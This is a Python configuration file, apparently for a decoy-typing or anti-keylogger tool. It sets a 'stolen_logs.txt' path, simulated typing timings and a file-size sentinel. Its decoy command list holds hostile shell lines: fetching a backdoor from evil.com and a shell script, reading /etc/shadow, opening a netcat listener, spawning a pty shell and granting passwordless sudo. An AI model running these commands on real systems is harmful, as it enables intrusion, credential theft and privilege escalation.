import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOG_FILE = os.path.join(BASE_DIR, "stolen_logs.txt")

DECOY_IDLE_SECONDS = 1.5
DECOY_BREAK_SECONDS = 1.0
DECOY_TYPO_CHANCE = 0.08
DECOY_POLL_INTERVAL = 0.5

SENTINEL_THRESHOLD_KB = 10
SENTINEL_POLL_INTERVAL = 1.0

DECOY_WORDS = [
    "admin", "root", "kali", "hack", "pass", "secret", "backup",
    "server", "local", "cloud", "shadow", "nmap", "exploit", "shell",
    "payload", "agent", "vpn", "proxy", "session", "token",
]

DECOY_COMMANDS = [
    "ls -la", "cat /etc/passwd", "whoami", "id",
    "ps aux", "netstat -tulpn", "ifconfig", "curl http://10.0.0.1/shell.sh",
    "nc -lvnp 4444", "chmod +x payload", "sudo -l",
    "find / -perm -4000 2>/dev/null", "ssh root@192.168.1.1",
    "scp exploit.tar.gz user@10.0.0.5:/tmp/",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
    "wget http://evil.com/backdoor", "./reverse_shell",
    "cat /etc/shadow", "nmap -sV -p- 10.0.0.0/24",
]

DECOY_DOMAINS = ["gmail.com", "protonmail.com", "outlook.com", "yahoo.com", "pm.me"]
